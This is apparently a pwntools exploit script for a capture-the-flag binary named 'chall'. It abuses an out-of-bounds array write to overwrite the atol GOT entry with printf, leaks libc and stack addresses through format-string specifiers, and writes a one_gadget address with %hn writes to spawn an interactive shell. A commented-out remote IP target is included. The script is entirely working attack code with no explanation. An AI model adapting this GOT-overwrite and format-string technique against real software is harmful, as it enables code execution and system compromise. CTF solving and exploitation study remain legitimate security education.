from pwn import *


binpath = './chall'
elf = ELF(binpath)
libc = elf.libc

context.binary = binpath
context.terminal = ['tmux', 'split-w', '-h']

gdbscript = '''
gef
# b calc_sum
# b *0x4008F2
# b *0x4008f0
# array[i] = input
# b *0x00000000040092C
# atol
b *0x400830

# ignore 1 17
ignore 1 18
c
'''
# io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
io = process(binpath)
# io = remote('18.179.178.246', 9005)


def send_num(num):
    io.sendlineafter(b'] = ', num)

context.log_level = 'DEBUG'
io.sendlineafter(b'n = ', b'22')

for i in range(14):
    send_num(b'%d' % i)

send_num(b'15')  # i == 15: (array + i) == &array
send_num(b'%d' % (elf.got['atol'] - 17 * 8))
send_num(b'%d' % elf.plt['printf'])

def fsb(fmt):
    send_num(fmt)
    return io.recvuntil(b'n')[:-1]

fmt = b''
fmt += b'%39$p\n'
fmt += b'%36$p\n'

data = fsb(fmt)
print(data)
addrs = list(map(lambda s: int(s, 16), data.split()))

addr_libc = addrs[0] - 0x20830
addr_addr_libc = addrs[1] + 8
print("addr_libc = 0x{:x}".format(addr_libc))
print("addr_addr_libc = 0x{:x}".format(addr_addr_libc))

gadget_offsets = [283158, 283242, 983716, 987463]
addr_gadget = addr_libc + gadget_offsets[0]
print('addr_gadget = 0x{:x}'.format(addr_gadget))


vals = [addr_gadget & 0xffff, (addr_gadget >> 16) & 0xffff]

fmt = b''
fmt += b'%' + (b'%d' % vals[0]) + b'c%11$hn'
fmt += b'A' * (0x18 - len(fmt))
fmt += p64(addr_addr_libc)  # 11

fsb(fmt)

fmt = b''
fmt += b'%' + (b'%d' % vals[1]) + b'c%11$hn'
fmt += b'B' * (0x18 - len(fmt))
fmt += p64(addr_addr_libc + 2)  # 11

fsb(fmt)


io.interactive()
